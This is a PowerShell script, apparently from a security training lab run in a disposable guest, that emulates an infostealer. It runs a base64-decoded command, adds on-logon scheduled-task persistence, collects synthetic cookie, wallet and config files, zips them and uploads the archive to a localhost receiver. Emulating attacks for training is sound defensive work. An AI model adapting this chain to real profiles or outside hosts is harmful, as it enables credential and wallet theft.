# Entry point shown on the training page. Run inside the disposable guest only.
$ErrorActionPreference = 'Stop'
$root = 'C:\Week8Lab'
$run = [IO.File]::ReadAllText("$root\run.txt")
$task = "Week8-Training-$run"
$source = "$root\synthetic-profile"
$stage = "$root\stage"
$archive = "$root\training.zip"
function Save-Json($name,$value) {
    [IO.File]::WriteAllText("$root\$name", ($value | ConvertTo-Json -Depth 8))
}
function Task-Command([string[]]$Arguments) {
    & schtasks.exe @Arguments
    if ($LASTEXITCODE) { throw "schtasks failed ($LASTEXITCODE): $Arguments" }
}
$registered = $false
try {
    $start = [datetime]::UtcNow.ToString('o')
    $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V3JpdGUtT3V0cHV0ICdXRUVLOC1MT0FERVIn'))
    if ($decoded -cne "Write-Output 'WEEK8-LOADER'") { throw 'Unexpected marker' }
    $marker = & ([scriptblock]::Create($decoded))
    [IO.File]::WriteAllText("$root\fake-update.marker",$marker)

    Task-Command @('/create','/tn',$task,'/sc','ONLOGON','/it','/rl','LIMITED','/tr',"cmd.exe /d /c $root\update-marker.cmd")
    $registered = $true
    $taskXml = Export-ScheduledTask -TaskName $task
    [IO.File]::WriteAllText("$root\task.xml",$taskXml)
    Task-Command @('/run','/tn',$task)
    for ($i=0; $i -lt 60 -and !(Test-Path "$root\task.marker"); $i++) { Start-Sleep -Milliseconds 500 }
    if ((Get-Content "$root\task.marker" -Raw).Trim() -ne $run) { throw 'Task marker mismatch' }

    $identity = (& whoami.exe | Out-String).Trim()
    $computer = (& hostname.exe | Out-String).Trim()
    $os = Get-CimInstance Win32_OperatingSystem
    $names = @(Get-ChildItem -LiteralPath $source -File | Sort-Object Name | Select-Object -ExpandProperty Name)
    if (($names -join ',') -cne 'config.ini,cookies.json,mock-browser.json,wallet.txt') { throw 'Unexpected discovery results' }
    $hashes = [ordered]@{}
    foreach ($name in $names) {
        $inputPath = Join-Path $source $name
        $bytes = [IO.File]::ReadAllBytes($inputPath)
        [IO.File]::WriteAllBytes((Join-Path $stage $name),$bytes)
        $hashes[$name] = (Get-FileHash -LiteralPath $inputPath).Hash
    }
    Compress-Archive -Path "$stage\*" -DestinationPath $archive -CompressionLevel Optimal
    $sent = Get-FileHash -LiteralPath $archive
    $response = Invoke-WebRequest -UseBasicParsing -Uri 'http://127.0.0.1:18768/receive' -Method Post -ContentType 'application/zip' -InFile $archive -TimeoutSec 30
    if ([int]$response.StatusCode -ne 201) { throw 'Receiver did not accept ZIP' }
    Task-Command @('/delete','/tn',$task,'/f')
    $registered = $false
    Save-Json 'completed.json' ([ordered]@{run=$run;start_utc=$start;end_utc=[datetime]::UtcNow.ToString('o');
        pid=$PID;marker=$marker;task=$task;task_marker=(Get-Content "$root\task.marker" -Raw).Trim();
        computer=$computer;user=$identity;os=$os.Caption;build=$os.BuildNumber;discovered=$names;
        source_hashes=$hashes;zip_hash=$sent.Hash;zip_bytes=(Get-Item $archive).Length;http_status=[int]$response.StatusCode})
} catch {
    [IO.File]::WriteAllText("$root\failure.txt",($_ | Out-String)+$_.ScriptStackTrace)
    throw
} finally {
    if ($registered) { & schtasks.exe /delete /tn $task /f | Out-Null }
}
